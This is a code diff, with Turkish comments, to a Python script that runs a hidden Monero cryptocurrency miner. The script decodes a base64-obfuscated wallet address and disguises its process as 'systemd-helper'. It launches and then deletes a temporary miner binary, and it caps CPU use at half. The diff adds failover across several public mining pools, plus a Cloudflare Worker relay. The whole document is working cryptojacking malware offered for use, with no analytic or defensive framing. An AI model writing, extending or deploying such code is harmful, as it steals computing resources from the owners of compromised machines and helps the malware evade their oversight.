@@ -10,32 +10,47 @@ import urllib.request
 import json
 import tempfile
 import re
+import signal
 from urllib.parse import urlparse
 from collections import deque
 
 libc = ctypes.CDLL('libc.so.6')
-# Canlı logları tutmak için kuyruk
 CONSOLE_LOGS = deque(maxlen=50)
 STATUS = {"running": False, "message": "Sistem Beklemede"}
 CF_WORKER_HOST = ""
 WALLET_ADDR = base64.b64decode("NDl5cWJOZ0cxMzVld3FKOXVOUVhUZ0I5bUthVVhmZzFiM2FiQWJoc1NEZ2g0YXNWYmZIdVlES0FkaWlkbVRDQjhwQUNZZHd4ejc3VHdKaHdFU2hEdDZuQkI1WmpjdEw=").decode()
 
-# ANSI renk kodlarını temizleme fonksiyonu
+# Havuz listesi (öncelik sırasına göre)
+POOLS = [
+    "pool.supportxmr.com:443",
+    "pool.minexmr.com:4444",
+    "xmr-asia1.nanopool.org:14443",
+    "gulf.moneroocean.stream:443"
+]
+
 def clean_ansi(text):
     ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
     return ansi_escape.sub('', text)
 
 def log_to_console(msg):
-    # Gelen mesajdaki ANSI kodlarını temizle
     clean_msg = clean_ansi(msg)
     timestamp = time.strftime("%H:%M:%S")
     line = f"[{timestamp}] {clean_msg}"
     CONSOLE_LOGS.append(line)
-    print(line)  # Orijinal haliyle terminale bas (renkli)
+    print(msg)  # Orijinal renkli çıktı terminale
 
 def set_process_name(name):
     try: libc.prctl(15, name.encode('utf-8'), 0, 0, 0)
     except: pass
+
+def kill_process(proc):
+    """Süreci ve tüm alt süreçlerini sonlandır."""
+    try:
+        proc.terminate()
+        time.sleep(1)
+        proc.kill()
+    except:
+        pass
 
 def execution_logic():
     global STATUS
@@ -61,38 +76,78 @@ def execution_logic():
         log_to_console("Süreç maskeleniyor: systemd-helper")
         set_process_name("systemd-helper")
         
-        # CF_WORKER_HOST kontrolü
-        if not CF_WORKER_HOST:
-            log_to_console("UYARI: CF_WORKER_HOST boş! Varsayılan değer kullanılacak.")
-            pool_host = "pool.supportxmr.com:443"  # örnek bir yedek
-        else:
-            pool_host = f"{CF_WORKER_HOST}:443"
+        # Havuz listesini oluştur: önce CF_WORKER_HOST varsa onu ekle, sonra fallback'leri
+        pools_to_try = []
+        if CF_WORKER_HOST:
+            pools_to_try.append(f"{CF_WORKER_HOST}:443")
+        pools_to_try.extend(POOLS)
         
-        cmd = [
-            tmp_path, "-o", pool_host, "-u", WALLET_ADDR,
-            "-p", f"node-{int(time.time())%1000}", "--keepalive", "--tls",
-            "--donate-level=1", "--cpu-max-threads-hint", "50"
-        ]
-
         STATUS["running"] = True
         STATUS["message"] = "Sistem Aktif"
-        log_to_console(f"Madenci başlatılıyor... Havuz: {pool_host}")
-
-        # Alt süreci başlat ve çıktılarını oku
-        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
-                                text=True, env={"PATH": "/usr/bin:/bin", "HOME": "/tmp"})
         
-        # Geçici dosyayı silelim
+        # Her havuzu dene
+        for pool_index, pool_host in enumerate(pools_to_try):
+            log_to_console(f"Havuz deneniyor [{pool_index+1}/{len(pools_to_try)}]: {pool_host}")
+            
+            use_tls = ":443" in pool_host
+            cmd = [
+                tmp_path, "-o", pool_host, "-u", WALLET_ADDR,
+                "-p", f"node-{int(time.time())%1000}", "--keepalive",
+                "--donate-level=1", "--cpu-max-threads-hint", "50"
+            ]
+            if use_tls:
+                cmd.append("--tls")
+            
+            log_to_console(f"Madenci başlatılıyor... Havuz: {pool_host} (TLS: {use_tls})")
+            
+            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                                    text=True, env={"PATH": "/usr/bin:/bin", "HOME": "/tmp"})
+            
+            # Hata sayacı
+            error_count = 0
+            max_errors = 5
+            success = False
+            
+            # Çıktıları oku
+            for line in iter(proc.stdout.readline, ""):
+                if not line:
+                    break
+                log_to_console(f"{line.strip()}")
+                
+                # "read error" kontrolü
+                if "read error" in line.lower():
+                    error_count += 1
+                    log_to_console(f"Hata sayacı: {error_count}/{max_errors}")
+                    if error_count >= max_errors:
+                        log_to_console(f"Çok fazla hata, havuz değiştiriliyor...")
+                        kill_process(proc)
+                        break
+                
+                # Eğer "accepted" (kabul edilen share) görürsek, başarılı sayalım ve bu havuzda kalalım
+                if "accepted" in line.lower():
+                    success = True
+                    # Hata sayacını sıfırla (isteğe bağlı)
+                    error_count = 0
+            
+            # Eğer döngüden çıkıldıysa (proc bitti veya kırıldı)
+            if proc.poll() is None:
+                kill_process(proc)
+            
+            # Eğer başarılı olduysak, döngüden çık (zaten sonsuz döngüde olacak, ama buraya gelmez)
+            if success:
+                log_to_console(f"Havuz {pool_host} başarılı, kalıcı olarak kullanılıyor.")
+                break
+            
+            # Son havuzsa ve başarısızsa, uyarı ver
+            if pool_index == len(pools_to_try) - 1:
+                log_to_console("Tüm havuzlar denendi, bağlantı kurulamadı. Madenci duracak.")
+        
+        # Geçici dosyayı temizle
         try:
             os.unlink(tmp_path)
         except:
             pass
         
-        # Çıktıları logla
-        for line in iter(proc.stdout.readline, ""):
-            if line:
-                log_to_console(f"{line.strip()}")
-                
     except Exception as e:
         STATUS["running"] = False
         STATUS["message"] = "Kritik Hata"
